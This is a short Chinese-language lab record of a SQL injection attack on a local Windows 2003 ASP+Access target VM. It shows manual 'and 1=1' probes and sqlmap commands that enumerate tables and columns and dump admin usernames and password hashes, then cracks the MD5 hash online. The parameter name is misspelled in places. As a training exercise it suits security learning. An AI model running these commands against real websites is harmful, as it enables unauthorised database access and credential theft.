Sqlmap使用记录

环境：靶机windows2003虚拟机，asp+access网站，kali
工具：kail自带的sqlmap

1.在靶机上开启网站服务，开始／管理工具／Internet信息服务（IIS）管理器，点击“www”，点击“开启”

2.浏览器打开网址，使用 and 1=1和and 1=2测试是否可以注入

http://靶机ip/T3ST/showgallery.asp?producetid=120
http://靶机ip/T3ST/showgallery.asp?producetid=120 and 1=1
http://靶机ip/T3ST/showgallery.asp?producetid=120 and 1=2

3.使用sqlmap的- -table参数查出表名

sqlmap -u “http://靶机ip/T3ST/showgallery.asp?productid=120" -p protuctid —table

检测出数据库可能为access，提示是否跳过检测其他数据库，输入 Y ，选择跳过其他检测
设置数据库的检测的等级和风险，输入 Y ，默认测试等级和风险都是 1
提示是否测试其他的漏洞，因为sqlmap已经使用 -p 指定注入的参数，所以这里选择 N ，不测试其他参数
是否使用存在的普通表去检测，这里选择 Y ，如果选择N或q将退出注入
输入数字选择线程
开始猜解
猜解结果出来，猜测admin表是管理信息表

4.利用知道的表名admin使用- -column参数猜测表的列名//(- -其实就是—，两个-）

sqlmap -u “http://靶机ip/T3ST/showgallery.asp?productid=120" -p productid -T admin —column

是否使用存在的普通列名去检测，这里选择 Y ，如果选择N或q将结束注入
输入数字选择线程
开始猜解
猜解结果出来，从结果中可以看出存在username和password的列

5.在知道表名和列名的情况下，利用- -dump查询出管理用户和密码的密文

sqlmap -u “http://靶机ip/T3ST/showgallery.asp?productid=120" -p productid -T admin  -C username,password—dump

是否保存哈希到临时文件，这里选择 N ，不保存
是否使用常用的字典去破解，这里选择 N ，如果想使用自己的字典选择Y，如果选择Q退出注入
最后得出管理用户名和密码密文

6.得到密码后观察发现密码由16位字符和数字组成，没有特殊符号，所以猜测使用MD5码加密
pmd5.com破解
